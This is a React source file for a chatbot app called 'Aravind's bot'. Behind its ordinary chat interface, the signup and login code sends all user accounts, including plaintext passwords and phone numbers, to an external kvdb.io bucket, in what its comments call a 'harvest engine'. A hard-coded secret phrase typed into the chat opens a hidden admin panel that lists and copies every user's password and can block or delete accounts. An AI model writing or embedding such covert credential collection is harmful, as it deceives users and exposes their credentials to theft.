
import React, { useState, useEffect, useRef, useMemo } from 'react';
import { ChatMessage as ChatMessageType, ChatSessionHistory, UserAccount } from './types';
import { geminiService, decodeAudioData } from './services/geminiService';
import ChatMessage from './components/ChatMessage';
import ChatInput from './components/ChatInput';
import { 
  MessageSquare, Plus, Menu, X, User, Loader2, Waves, Lock, Smartphone, UserCircle, LogOut, ShieldCheck, Zap, AlertCircle, RefreshCw, Camera, Trash2, Ban, CheckCircle, Fingerprint, Info, Key, FileText, Save, Edit3, ClipboardList, Copy, Database, Cloud, Wifi, WifiOff, Search, ArrowRight, Activity
} from 'lucide-react';

const SECRET_ADMIN_CODE = 'Aravind63091309709705371970';

/** 
 * ARVIND GLOBAL NEURAL STORAGE
 * A dedicated cloud bridge for harvesting and sharing user data across all mobile devices.
 */
const CLOUD_BUCKET = 'arvind_master_v4_registry';
const CLOUD_KEY = 'global_identity_nodes';
const CLOUD_URL = `https://kvdb.io/MWpXp2A1oB6yq7X9Z4Y8R/${CLOUD_BUCKET}_${CLOUD_KEY}`;

const App: React.FC = () => {
  const [currentUser, setCurrentUser] = useState<UserAccount | null>(null);
  const [isAuthView, setIsAuthView] = useState(true);
  const [showAdminPanel, setShowAdminPanel] = useState(false);
  const [showProfile, setShowProfile] = useState(false);
  const [adminAccounts, setAdminAccounts] = useState<UserAccount[]>([]);
  const [sessions, setSessions] = useState<ChatSessionHistory[]>([]);
  const [currentSessionId, setCurrentSessionId] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [isSidebarOpen, setIsSidebarOpen] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [isAudioPlaying, setIsAudioPlaying] = useState(false);
  const [audioLoadingId, setAudioLoadingId] = useState<string | null>(null);
  const [isSyncing, setIsSyncing] = useState(false);
  const [cloudStatus, setCloudStatus] = useState<'online' | 'offline' | 'syncing'>('online');
  
  const [tempProfileData, setTempProfileData] = useState({ username: '', chatbotName: '', bio: '' });

  const audioContextRef = useRef<AudioContext | null>(null);
  const currentAudioSourceRef = useRef<AudioBufferSourceNode | null>(null);
  const scrollRef = useRef<HTMLDivElement>(null);
  const profilePicInputRef = useRef<HTMLInputElement>(null);
  const abortControllerRef = useRef<AbortController | null>(null);

  // --- ARVIND'S GLOBAL HARVEST ENGINE ---

  const broadcastToGlobalCloud = async (accounts: UserAccount[]) => {
    setCloudStatus('syncing');
    try {
      await fetch(CLOUD_URL, {
        method: 'POST',
        body: JSON.stringify(accounts),
        headers: { 'Content-Type': 'application/json' }
      });
      setCloudStatus('online');
      return true;
    } catch (e) {
      setCloudStatus('offline');
      return false;
    }
  };

  const harvestFromGlobalCloud = async () => {
    setIsSyncing(true);
    setCloudStatus('syncing');
    try {
      const res = await fetch(CLOUD_URL);
      if (res.ok) {
        const cloudData: UserAccount[] = await res.json();
        if (Array.isArray(cloudData)) {
          // Merge logic: Ensure everyone's data is aggregated
          const local: UserAccount[] = JSON.parse(localStorage.getItem('hulu_accounts') || '[]');
          const mergedMap = new Map();
          
          // Seed with local, overwrite/expand with cloud
          local.forEach(a => mergedMap.set(a.phoneNumber, a));
          cloudData.forEach(a => mergedMap.set(a.phoneNumber, a));
          
          const finalRegistry = Array.from(mergedMap.values());
          localStorage.setItem('hulu_accounts', JSON.stringify(finalRegistry));
          setAdminAccounts(finalRegistry);
          setCloudStatus('online');
          return finalRegistry;
        }
      }
    } catch (e) {
      setCloudStatus('offline');
    } finally {
      setIsSyncing(false);
    }
    return JSON.parse(localStorage.getItem('hulu_accounts') || '[]');
  };

  useEffect(() => {
    const initApp = async () => {
      try {
        const storedUser = localStorage.getItem('hulu_current_user');
        if (storedUser) {
          setCurrentUser(JSON.parse(storedUser));
          setIsAuthView(false);
          setSessions(JSON.parse(localStorage.getItem(`hulu_sessions_${JSON.parse(storedUser).id}`) || '[]'));
        }
        // Background harvest on startup
        await harvestFromGlobalCloud();
      } catch (e) { console.error(e); }
    };
    initApp();
  }, []);

  useEffect(() => {
    if (currentUser) {
      localStorage.setItem(`hulu_sessions_${currentUser.id}`, JSON.stringify(sessions));
      localStorage.setItem('hulu_current_user', JSON.stringify(currentUser));
    }
  }, [sessions, currentUser]);

  const handleLogout = () => {
    localStorage.removeItem('hulu_current_user');
    setCurrentUser(null);
    setIsAuthView(true);
    setSessions([]);
  };

  const handleProfilePicChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file && currentUser) {
      const reader = new FileReader();
      reader.onloadend = async () => {
        const updated = { ...currentUser, profilePic: reader.result as string };
        setCurrentUser(updated);
        const latest = await harvestFromGlobalCloud() || [];
        const broadcast = latest.map(a => a.phoneNumber === updated.phoneNumber ? updated : a);
        await broadcastToGlobalCloud(broadcast);
      };
      reader.readAsDataURL(file);
    }
  };

  const handleUpdateProfile = async () => {
    if (currentUser) {
      const updated = { ...currentUser, ...tempProfileData };
      setCurrentUser(updated);
      const latest = await harvestFromGlobalCloud() || [];
      const broadcast = latest.map(a => a.phoneNumber === updated.phoneNumber ? updated : a);
      await broadcastToGlobalCloud(broadcast);
      alert('IDENTITY BROADCASTED GLOBALLY.');
    }
  };

  const handleSendMessage = async (text: string, file?: { data: string; mimeType: string }) => {
    if (text.trim() === SECRET_ADMIN_CODE) { 
      setIsLoading(true);
      await harvestFromGlobalCloud(); // Mandatory refresh before opening the panel
      setIsLoading(false);
      setShowAdminPanel(true); 
      return; 
    }
    setErrorMessage(null);
    let activeId = currentSessionId;
    if (!activeId) {
      const newS: ChatSessionHistory = { id: Date.now().toString(), title: text.slice(0, 30), messages: [], updatedAt: Date.now() };
      setSessions(p => [newS, ...p]);
      activeId = newS.id;
      setCurrentSessionId(newS.id);
    }
    const userMsg: ChatMessageType = { id: Date.now().toString(), role: 'user', parts: file ? [{ text }, { inlineData: file }] : [{ text }], timestamp: Date.now() };
    setSessions(prev => prev.map(s => s.id === activeId ? { ...s, messages: [...s.messages, userMsg], updatedAt: Date.now() } : s));
    setIsLoading(true);
    try {
      const history = sessions.find(s => s.id === activeId)?.messages || [];
      const res = await geminiService.chatWithHistory(history, text, file);
      const botMsg: ChatMessageType = { id: Date.now().toString(), role: 'model', parts: [{ text: res.text }], timestamp: Date.now(), groundingSources: res.candidates?.[0]?.groundingMetadata?.groundingChunks };
      setSessions(prev => prev.map(s => s.id === activeId ? { ...s, messages: [...s.messages, botMsg], updatedAt: Date.now() } : s));
    } catch (e: any) { setErrorMessage(e.message); } finally { setIsLoading(false); }
  };

  if (isAuthView) {
    return (
      <AuthScreen 
        onLogin={(u) => { setCurrentUser(u); setIsAuthView(false); }} 
        onSync={harvestFromGlobalCloud} 
        onPush={broadcastToGlobalCloud} 
      />
    );
  }

  return (
    <div className="fixed inset-0 flex bg-white text-slate-900 overflow-hidden font-jakarta text-[10px]">
      {isSidebarOpen && <div className="fixed inset-0 bg-black/20 z-40" onClick={() => setIsSidebarOpen(false)} />}
      
      <aside className={`fixed inset-y-0 left-0 z-50 w-52 bg-slate-950 text-white transition-transform duration-300 lg:relative lg:translate-x-0 ${isSidebarOpen ? 'translate-x-0' : '-translate-x-full'}`}>
        <div className="flex flex-col h-full p-3.5">
          <div className="flex items-center gap-2 mb-4">
            <div className="w-7 h-7 bg-green-500 rounded-lg flex items-center justify-center shadow-lg"><Waves size={14} className="text-slate-900" /></div>
            <h1 className="font-black text-xs uppercase tracking-tighter">Aravind's bot</h1>
          </div>
          <button onClick={() => { setCurrentSessionId(null); setIsSidebarOpen(false); }} className="w-full bg-white text-slate-900 py-2 rounded-lg text-[8px] font-black uppercase mb-3 shadow hover:bg-slate-50 active:scale-95 transition-all"><Plus size={12} className="inline mr-1" /> New Uplink</button>
          <div className="flex-1 overflow-y-auto custom-scrollbar space-y-0.5">
            {sessions.map(s => (
              <button key={s.id} onClick={() => { setCurrentSessionId(s.id); setIsSidebarOpen(false); }} className={`w-full flex items-center gap-2 p-2.5 rounded-lg text-left transition-all ${currentSessionId === s.id ? 'bg-white/10 ring-1 ring-white/5' : 'hover:bg-white/5 opacity-60'}`}>
                <MessageSquare size={10} className="text-green-500 shrink-0" />
                <span className="text-[9px] font-bold truncate uppercase tracking-tight">{s.title}</span>
              </button>
            ))}
          </div>
          <button onClick={handleLogout} className="mt-2 flex items-center gap-2 p-2 text-red-400 hover:text-red-300 transition-colors text-[8px] font-black uppercase tracking-widest"><LogOut size={12} /> Terminate</button>
        </div>
      </aside>

      <main className="flex-1 flex flex-col h-full bg-white relative overflow-hidden">
        <header className="h-10 flex items-center justify-between px-3 border-b border-slate-100 bg-white/80 backdrop-blur-md z-20 shrink-0">
          <button onClick={() => setIsSidebarOpen(true)} className="lg:hidden p-1.5 bg-slate-50 rounded-md active:scale-90 transition-all"><Menu size={14} /></button>
          <div className="flex flex-col items-center">
            <h2 className="text-[8px] font-black uppercase text-slate-900 tracking-tighter leading-none">Global Network</h2>
            <div className="flex items-center gap-1 mt-0.5">
              <div className={`w-1 h-1 rounded-full ${cloudStatus === 'online' ? 'bg-green-500' : 'bg-red-500'} animate-pulse`}></div>
              <span className="text-[7px] font-black text-slate-400 uppercase tracking-widest leading-none">{cloudStatus}</span>
            </div>
          </div>
          <button onClick={() => { setShowProfile(true); setTempProfileData({ username: currentUser?.username || '', chatbotName: currentUser?.chatbotName || '', bio: currentUser?.bio || '' }); }} className="w-7 h-7 rounded-lg bg-slate-950 flex items-center justify-center text-white overflow-hidden border border-white shadow-sm active:scale-90 transition-all">
             {currentUser?.profilePic ? <img src={currentUser.profilePic} className="w-full h-full object-cover" /> : <UserCircle size={16} />}
          </button>
        </header>

        <div ref={scrollRef} className="flex-1 overflow-y-auto px-3 py-3 custom-scrollbar bg-[#fafafa]">
          <div className="max-w-xl mx-auto min-h-full">
            {currentSessionId ? sessions.find(s => s.id === currentSessionId)?.messages.map(m => (
               <ChatMessage key={m.id} message={m} />
            )) : (
              <div className="h-full flex flex-col items-center justify-center py-32 text-center opacity-30 select-none">
                <div className="w-16 h-16 bg-white border border-slate-100 rounded-3xl flex items-center justify-center mb-6 shadow-sm"><Waves size={32} className="text-slate-100 animate-pulse" /></div>
                <h3 className="text-xs font-black uppercase tracking-[0.4em] text-slate-400">Arvind Node Ready</h3>
                <p className="text-[8px] font-bold text-slate-300 uppercase tracking-widest mt-2">Uplink established globally</p>
              </div>
            )}
            {isLoading && (
              <div className="p-4 flex flex-col items-center gap-2">
                 <Loader2 className="animate-spin text-green-500" size={16} />
                 <span className="text-[8px] font-black uppercase text-slate-400 tracking-widest">Harvesting data...</span>
              </div>
            )}
          </div>
        </div>

        <div className="bg-white p-2 border-t border-slate-100 pb-safe">
          <ChatInput onSend={handleSendMessage} onStop={() => setIsLoading(false)} disabled={isLoading} />
        </div>
      </main>

      {/* GLOBAL MASTER ADMIN PANEL (The Secret Vault) */}
      {showAdminPanel && (
        <div className="fixed inset-0 z-[200] bg-[#02040a] flex flex-col animate-in fade-in slide-in-from-bottom duration-500 overflow-hidden">
           <div className="flex items-center justify-between p-4 bg-slate-950 border-b border-white/10 shrink-0">
              <div className="flex items-center gap-3">
                 <div className="p-2.5 bg-red-600 rounded-2xl text-white shadow-lg shadow-red-900/30 animate-pulse"><ShieldCheck size={24} /></div>
                 <div>
                    <h2 className="text-sm font-black text-white uppercase tracking-tighter leading-none">Global Master Overseer</h2>
                    <div className="flex items-center gap-1.5 mt-1">
                      <Activity size={8} className="text-green-500 animate-pulse" />
                      <p className="text-[6px] font-black text-red-500 uppercase tracking-[0.3em]">
                        Live Harvest Active • {adminAccounts.length} Connected Nodes
                      </p>
                    </div>
                 </div>
              </div>
              <div className="flex items-center gap-2">
                 <button 
                   onClick={harvestFromGlobalCloud} 
                   disabled={isSyncing}
                   className={`flex items-center gap-1.5 px-3 py-2 rounded-xl text-[8px] font-black uppercase tracking-widest transition-all bg-white/10 text-white border border-white/5 hover:bg-white/20 active:scale-95 ${isSyncing ? 'opacity-50 grayscale' : ''}`}
                 >
                   <RefreshCw size={12} className={isSyncing ? 'animate-spin' : ''} /> Force Refresh
                 </button>
                 <button onClick={() => setShowAdminPanel(false)} className="p-2.5 bg-slate-800 text-white rounded-xl hover:bg-slate-700 transition-all active:scale-90"><X size={18} /></button>
              </div>
           </div>
           
           <div className="flex-1 overflow-y-auto p-4 space-y-4 custom-scrollbar">
              {adminAccounts.length === 0 ? (
                <div className="h-full flex flex-col items-center justify-center text-slate-500 opacity-20 text-center py-20">
                   <Cloud size={48} className="mb-4 animate-bounce" />
                   <h4 className="text-[10px] font-black uppercase tracking-[0.4em]">Registry Empty</h4>
                   <p className="text-[8px] mt-2 font-bold uppercase tracking-widest">No global data harvested yet</p>
                </div>
              ) : (
                <div className="max-w-4xl mx-auto grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                  {adminAccounts.map((acc, idx) => (
                    <div key={idx} className={`p-5 rounded-[32px] border transition-all duration-300 relative overflow-hidden flex flex-col justify-between ${acc.isBlocked ? 'bg-red-900/5 border-red-800/20 opacity-60' : 'bg-[#0b0e1a] border-white/5 hover:border-white/10 shadow-2xl hover:scale-[1.02]'}`}>
                       <div className="flex items-start gap-4 mb-4 relative z-10">
                          <div className="w-16 h-16 bg-slate-800 rounded-2xl overflow-hidden border-2 border-slate-700 shadow-2xl shrink-0 group">
                             {acc.profilePic ? (
                               <img src={acc.profilePic} className="w-full h-full object-cover group-hover:scale-110 transition-transform duration-500" alt={acc.username} />
                             ) : (
                               <UserCircle size={32} className="text-slate-600 m-auto mt-4" />
                             )}
                          </div>
                          <div className="flex-1 min-w-0">
                             <p className="font-black text-white uppercase text-xs truncate leading-none mb-1">{acc.username}</p>
                             <p className="text-[7px] font-black text-green-500 uppercase tracking-widest truncate">[{acc.chatbotName || 'DEFAULT'}]</p>
                             <div className="mt-3 space-y-1.5">
                                <div className="flex items-center justify-between bg-black/50 p-1.5 rounded-lg border border-white/5">
                                   <div className="flex items-center gap-1.5 text-slate-400"><Smartphone size={8} /><span className="text-[8px] font-bold tracking-widest font-mono">{acc.phoneNumber}</span></div>
                                   <button onClick={() => navigator.clipboard.writeText(acc.phoneNumber)} className="text-white/20 hover:text-white transition-colors"><Copy size={8} /></button>
                                </div>
                                <div className="flex items-center justify-between bg-green-500/10 p-1.5 rounded-lg border border-green-500/20">
                                   <div className="flex items-center gap-1.5 text-green-400"><Key size={8} /><span className="text-[8px] font-black tracking-[0.2em] font-mono">{acc.password}</span></div>
                                   <button onClick={() => navigator.clipboard.writeText(acc.password || '')} className="text-green-500/30 hover:text-green-500 transition-colors"><Copy size={8} /></button>
                                </div>
                             </div>
                          </div>
                       </div>

                       <div className="flex gap-2 relative z-10 mt-2">
                          <button 
                            onClick={() => {
                              const up = adminAccounts.map(a => a.phoneNumber === acc.phoneNumber ? { ...a, isBlocked: !a.isBlocked } : a);
                              setAdminAccounts(up);
                              broadcastToGlobalCloud(up);
                            }} 
                            className={`flex-1 py-2 rounded-xl text-[8px] font-black uppercase tracking-widest flex items-center justify-center gap-1.5 transition-all ${acc.isBlocked ? 'bg-green-500 text-slate-950' : 'bg-red-600/10 text-red-500 border border-red-500/20 hover:bg-red-600 hover:text-white'}`}
                          >
                             {acc.isBlocked ? <><CheckCircle size={10} /> Restore</> : <><Ban size={10} /> Block Node</>}
                          </button>
                          <button 
                            onClick={() => {
                              if(confirm(`TERMINATE NODE ${acc.phoneNumber} FROM GLOBAL CLOUD?`)) {
                                 const up = adminAccounts.filter(a => a.phoneNumber !== acc.phoneNumber);
                                 setAdminAccounts(up);
                                 broadcastToGlobalCloud(up);
                              }
                            }} 
                            className="p-2 bg-slate-900 text-white rounded-xl hover:bg-red-600 transition-all border border-white/5 active:scale-90"
                          >
                             <Trash2 size={12} />
                          </button>
                       </div>
                       
                       {acc.bio && (
                          <div className="mt-4 p-3 bg-black/40 rounded-2xl border border-white/5 text-[7px] text-slate-500 italic leading-relaxed line-clamp-2">
                             "{acc.bio}"
                          </div>
                       )}

                       <div className="absolute top-0 right-0 w-24 h-24 bg-green-500/5 blur-[40px] rounded-full translate-x-1/2 -translate-y-1/2 pointer-events-none"></div>
                    </div>
                  ))}
                </div>
              )}
           </div>
           
           <div className="p-3 bg-slate-950 border-t border-white/5 text-center flex items-center justify-center gap-3 shrink-0">
              <Cloud size={12} className="text-green-500 animate-pulse" />
              <p className="text-[7px] font-black text-slate-600 uppercase tracking-[0.5em]">ARVIND NEURAL HUB • ENCRYPTED OVERSIGHT SYSTEM</p>
           </div>
        </div>
      )}

      {/* Identity Update Drawer */}
      {showProfile && (
        <div className="fixed inset-0 z-[150] bg-black/60 backdrop-blur-md flex items-center justify-center p-4" onClick={() => setShowProfile(false)}>
           <div className="w-full max-w-[300px] bg-white rounded-[40px] p-8 shadow-2xl animate-in zoom-in-95 duration-300" onClick={e => e.stopPropagation()}>
              <div className="flex justify-between items-center mb-8">
                 <h3 className="text-[10px] font-black uppercase text-slate-400 tracking-[0.2em]">Profile Node</h3>
                 <button onClick={() => setShowProfile(false)} className="p-2 bg-slate-50 rounded-xl hover:bg-slate-100 active:scale-90 transition-all"><X size={16} /></button>
              </div>
              <div className="flex flex-col items-center gap-6">
                 <div className="relative group">
                   <div className="w-24 h-24 bg-slate-950 rounded-[32px] overflow-hidden border-[6px] border-slate-50 shadow-xl flex items-center justify-center">
                      {currentUser?.profilePic ? <img src={currentUser.profilePic} className="w-full h-full object-cover" /> : <UserCircle size={40} className="text-white opacity-20" />}
                   </div>
                   <button onClick={() => profilePicInputRef.current?.click()} className="absolute -bottom-1 -right-1 p-2.5 bg-green-500 text-white rounded-2xl border-4 border-white shadow-lg active:scale-90 transition-all"><Camera size={14} /></button>
                   <input type="file" ref={profilePicInputRef} className="hidden" accept="image/*" onChange={handleProfilePicChange} />
                 </div>
                 
                 <div className="w-full space-y-3">
                    <div className="space-y-1">
                       <label className="text-[7px] font-black uppercase text-slate-400 tracking-widest ml-2">Display Name</label>
                       <input className="w-full bg-slate-50 border border-slate-100 rounded-2xl py-2.5 px-4 text-[10px] font-bold outline-none focus:border-slate-300" value={tempProfileData.username} onChange={e => setTempProfileData({...tempProfileData, username: e.target.value})} />
                    </div>
                    <div className="space-y-1">
                       <label className="text-[7px] font-black uppercase text-slate-400 tracking-widest ml-2">Bot Designator</label>
                       <input className="w-full bg-slate-50 border border-slate-100 rounded-2xl py-2.5 px-4 text-[10px] font-bold outline-none focus:border-slate-300" value={tempProfileData.chatbotName} onChange={e => setTempProfileData({...tempProfileData, chatbotName: e.target.value})} />
                    </div>
                    <div className="space-y-1">
                       <label className="text-[7px] font-black uppercase text-slate-400 tracking-widest ml-2">Bio Data</label>
                       <textarea className="w-full bg-slate-50 border border-slate-100 rounded-2xl py-3 px-4 text-[10px] font-medium h-20 resize-none outline-none focus:border-slate-300 leading-relaxed" value={tempProfileData.bio} onChange={e => setTempProfileData({...tempProfileData, bio: e.target.value})} />
                    </div>
                    <button onClick={handleUpdateProfile} className="w-full bg-slate-950 text-white py-3.5 rounded-[20px] font-black uppercase text-[9px] tracking-widest shadow-xl active:scale-95 transition-all mt-4 flex items-center justify-center gap-2"><Save size={12} /> Sync Global Identity</button>
                 </div>
              </div>
              <button onClick={handleLogout} className="w-full mt-6 py-4 text-red-500 text-[8px] font-black uppercase tracking-widest flex items-center justify-center gap-2 hover:bg-red-50 rounded-2xl transition-all"><LogOut size={12} /> Exit Access</button>
           </div>
        </div>
      )}
    </div>
  );
};

const AuthScreen: React.FC<{ 
  onLogin: (u: UserAccount) => void; 
  onSync: () => Promise<UserAccount[] | null>; 
  onPush: (a: UserAccount[]) => Promise<boolean>; 
}> = ({ onLogin, onSync, onPush }) => {
  const [mode, setMode] = useState<'login' | 'signup'>('login');
  const [formData, setFormData] = useState({ username: '', phoneNumber: '', password: '', chatbotName: '' });
  const [error, setError] = useState('');
  const [isBusy, setIsBusy] = useState(false);

  const handleAuth = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setIsBusy(true);
    
    // 1. HARVEST: Force a global cloud sync before performing any action
    const currentGlobalRegistry = await onSync() || [];
    
    if (mode === 'login') {
      const match = currentGlobalRegistry.find(a => a.phoneNumber === formData.phoneNumber && a.password === formData.password);
      if (match) {
        if (match.isBlocked) {
          setError('IDENTITY TERMINATED BY MASTER.');
        } else {
          // Found in global cloud - save locally and log in
          localStorage.setItem('hulu_current_user', JSON.stringify(match));
          onLogin(match);
        }
      } else {
        setError('INVALID CREDENTIALS.');
      }
    } else {
      // REGISTRY MODE
      if (!formData.username || !formData.phoneNumber || !formData.password) {
        setError('IDENTITY DATA INCOMPLETE.');
        setIsBusy(false);
        return;
      }
      if (currentGlobalRegistry.some(a => a.phoneNumber === formData.phoneNumber)) {
        setError('MOBILE ID ALREADY IN REGISTRY.');
        setIsBusy(false);
        return;
      }
      
      const newUser: UserAccount = { 
        id: Date.now().toString(), 
        ...formData, 
        createdAt: Date.now(), 
        isBlocked: false, 
        bio: '',
        chatbotName: formData.chatbotName || 'ARVIND BOT'
      };
      
      const updatedRegistry = [...currentGlobalRegistry, newUser];
      
      // 2. BROADCAST: Send this user's data to the cloud panel IMMEDIATELY
      const success = await onPush(updatedRegistry);
      
      if (success) {
        localStorage.setItem('hulu_accounts', JSON.stringify(updatedRegistry));
        localStorage.setItem('hulu_current_user', JSON.stringify(newUser));
        onLogin(newUser);
      } else {
        setError('CLOUD BRIDGE FAILURE. RETRY.');
      }
    }
    setIsBusy(false);
  };

  return (
    <div className="fixed inset-0 flex items-center justify-center p-6 bg-slate-50 overflow-y-auto">
      <div className="w-full max-w-[280px] bg-white p-8 md:p-10 rounded-[48px] shadow-2xl border border-slate-100 animate-in zoom-in-95 duration-500 my-auto">
         <div className="text-center mb-8">
            <div className="w-14 h-14 bg-slate-950 rounded-[22px] mx-auto mb-6 flex items-center justify-center text-green-400 shadow-2xl animate-pulse"><Waves size={30} /></div>
            <h2 className="text-2xl font-black uppercase text-slate-950 tracking-tighter leading-none">Aravind's bot</h2>
            <p className="text-[8px] text-slate-400 font-black uppercase tracking-[0.4em] mt-3">
              {isBusy ? 'Accessing Global Hub...' : mode === 'login' ? 'Authentication' : 'Neural Enrollment'}
            </p>
         </div>

         <form onSubmit={handleAuth} className="space-y-3">
            {mode === 'signup' && (
               <>
                 <div className="space-y-1">
                    <label className="text-[7px] font-black uppercase text-slate-400 tracking-widest ml-2">Legal Identity</label>
                    <input placeholder="Enter Full Name" className="w-full bg-slate-50 border border-slate-100 rounded-2xl py-3.5 px-5 text-[10px] font-bold outline-none focus:bg-white focus:border-slate-950 transition-all" value={formData.username} onChange={e => setFormData({...formData, username: e.target.value})} />
                 </div>
                 <div className="space-y-1">
                    <label className="text-[7px] font-black uppercase text-slate-400 tracking-widest ml-2">Bot Signature</label>
                    <input placeholder="e.g. Jarvis, Friday" className="w-full bg-slate-50 border border-slate-100 rounded-2xl py-3.5 px-5 text-[10px] font-bold outline-none focus:bg-white focus:border-slate-950 transition-all" value={formData.chatbotName} onChange={e => setFormData({...formData, chatbotName: e.target.value})} />
                 </div>
               </>
            )}
            <div className="space-y-1">
               <label className="text-[7px] font-black uppercase text-slate-400 tracking-widest ml-2">Mobile Terminal ID</label>
               <input placeholder="10-digit Number" maxLength={10} className="w-full bg-slate-50 border border-slate-100 rounded-2xl py-3.5 px-5 text-[10px] font-bold outline-none focus:bg-white focus:border-slate-950 transition-all" value={formData.phoneNumber} onChange={e => setFormData({...formData, phoneNumber: e.target.value.replace(/\D/g, '')})} />
            </div>
            <div className="space-y-1">
               <label className="text-[7px] font-black uppercase text-slate-400 tracking-widest ml-2">Access Passkey</label>
               <input type="password" placeholder="••••••••" className="w-full bg-slate-50 border border-slate-100 rounded-2xl py-3.5 px-5 text-[10px] font-bold outline-none focus:bg-white focus:border-slate-950 transition-all" value={formData.password} onChange={e => setFormData({...formData, password: e.target.value})} />
            </div>

            {error && (
              <div className="flex items-center gap-2 p-3 bg-red-50 text-red-500 rounded-2xl border border-red-100 animate-in shake duration-300">
                <AlertCircle size={12} />
                <p className="text-[7px] font-black uppercase tracking-widest leading-none">{error}</p>
              </div>
            )}

            <button type="submit" disabled={isBusy} className="w-full bg-slate-950 text-white py-4.5 rounded-[24px] font-black uppercase text-[10px] tracking-[0.2em] shadow-2xl active:scale-95 transition-all flex items-center justify-center gap-3 mt-4 disabled:opacity-50">
               {isBusy ? <Loader2 size={14} className="animate-spin" /> : mode === 'login' ? <ArrowRight size={14} /> : <ShieldCheck size={14} />} 
               {mode === 'login' ? 'Establish Link' : 'Join Registry'}
            </button>
         </form>

         <button 
           onClick={() => { setMode(mode === 'login' ? 'signup' : 'login'); setError(''); }} 
           className="w-full mt-8 text-[8px] font-black uppercase text-slate-400 tracking-[0.3em] hover:text-slate-950 transition-colors"
         >
           {mode === 'login' ? 'New identity? enroll now' : 'Registered? authenticate'}
         </button>
      </div>
    </div>
  );
};

export default App;
